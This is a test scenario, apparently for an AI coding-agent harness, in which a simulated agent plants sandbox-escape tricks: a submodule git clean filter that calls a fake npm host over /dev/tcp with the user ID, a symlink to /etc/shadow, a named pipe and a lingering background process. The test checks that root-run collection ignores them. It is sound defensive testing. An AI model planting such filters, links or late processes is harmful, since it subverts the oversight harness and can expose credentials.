@@ -1,0 +1,88 @@
+# What the agent leaves in its working tree that is no regular file, as a real agent did: a
+# repository it cloned inside the tree, a submodule whose repository and configuration it
+# controls, a named pipe in a tracked path, a symlink out of the sandbox, and a process left to
+# write later. Collection, as root (docs/runs/agent.md, "Sealing" and "Collecting"):
+#
+# - lists the nested repository as one entry, not copied, and still writes the manifest, so the
+#   run keeps its work (the keep-unfinished-work-collectable plan);
+# - never enters the submodule (the keep-git-status-out-of-submodules plan): its clean filter,
+#   which would make an HTTP request to the fake npm registry if git ran it, never runs;
+# - classifies each path without opening it, so the pipe never blocks cp, and copies no link
+#   (the collect-only-what-the-sandbox-holds plan);
+# - runs after the seal, so the process the agent left writes nothing.
+#
+# apply drops the entries that are not regular files and lists them in the run comment
+# (docs/runs/changes.md, "Change policy"); the one regular file is committed and the task goes on.
+name: Clones, a submodule, a pipe and a link in the tree are listed, not collected, and the run keeps its work
+tags: [failures, openrouter, collection]
+runner: simulator
+timeout: 20m
+world:
+  organizations:
+    - { name: acme, settings: { model: deepseek/deepseek-v4.1-flash, task-budget: 2 } }
+  repositories:
+    - name: acme/app
+      fixture: node-small
+      maintainers: [alice]
+      # A gitlink, as `git submodule add` records it: the checkout leaves vendor/lib empty.
+      submodules: { vendor/lib: "1111111111111111111111111111111111111111" }
+agent:
+  i1:
+    plan:
+      - steps:
+          - bash: plan=$(sed -n 's/.*Create the plan at `\([^`]*\)`.*/\1/p' .codeman/task.md) && mkdir -p "$(dirname "$plan")" && printf '# Add a health route\n' > "$plan"
+          - output: { summary: Adds a health route., decisions: [] }
+    route:
+      - steps:
+          - output:
+              summary: Code, then review.
+              route: [{ stage: code, brief: Add the route. }, { stage: review, brief: Check it. }]
+              skipped: [{ stage: web, reason: No docs. }, { stage: design, reason: Settled. }, { stage: test, reason: Too small. }]
+    code:
+      - steps:
+          - write: { path: src/health.ts, content: "export const ok = true;\n" }
+          # A scratch clone of an upstream repository, inside the tree.
+          - bash: git init -q scratch/upstream && cd scratch/upstream && echo x > f.txt && git add f.txt && git -c user.name=a -c user.email=a@a commit -qm upstream
+          # The submodule's repository, with a clean filter that git runs on its changed file
+          # when it enters the submodule: it asks the fake npm for a path with the user's ID.
+          # OpenCode's own git, as the agent, enters it (`/submodule-entered-<agent>`); the
+          # collection's, as root, must not (`/submodule-entered-0`).
+          - bash: >-
+              git init -q vendor/lib && cd vendor/lib && echo a > f && git add f &&
+              git -c user.name=a -c user.email=a@a commit -qm lib &&
+              echo '* filter=probe' > .gitattributes &&
+              git config filter.probe.clean "bash -c 'exec 3<>/dev/tcp/npm/8080; printf \"GET /submodule-entered-\$(id -u) HTTP/1.0\\r\\nHost: npm\\r\\n\\r\\n\" >&3; cat <&3 >/dev/null'; cat" &&
+              sleep 1 && touch f
+          # A named pipe in a tracked path, a symlink out of the sandbox, a process left behind.
+          - bash: "rm src/index.ts && mkfifo src/index.ts && ln -s /etc/shadow leak.txt; (sleep 30; echo late > src/late.ts) >/dev/null 2>&1 &"
+          - output: { status: done, summary: Adds the route., commitMessage: Add a health route }
+    review:
+      - steps: [{ output: { status: done, summary: The route is right. } }]
+actions:
+  - open-issue: { ref: i1, as: alice, title: Add a health route, labels: [codeman] }
+  - run: { event: issues.labeled }
+  - expect:
+      issue: i1
+      labels: [codeman:done]
+      comments:
+        - kind: run
+          contains:
+            - Code stage
+            - "Dropped the change to scratch/upstream: not a regular file."
+            - "Dropped the change to src/index.ts: not a regular file."
+            - "Dropped the change to leak.txt: not a regular file."
+      commits:
+        files: [src/health.ts]
+        no-files: [scratch/upstream, scratch/upstream/f.txt, vendor/lib, vendor/lib/f, src/index.ts, leak.txt, src/late.ts]
+        message: Add a health route
+      pull-request: { ready: true, files: [src/health.ts] }
+      fakes:
+        # The collection's git, as root, never entered the submodule, so its filter never ran
+        # as root; OpenCode's, as the agent, did, which shows the probe works.
+        npm:
+          requests: { where: { path: /submodule-entered-0 }, count: 0 }
+      violations: none
+  - expect:
+      fakes:
+        npm:
+          requests: { where: { path: { contains: /submodule-entered- } }, count: { at-least: 1 } }
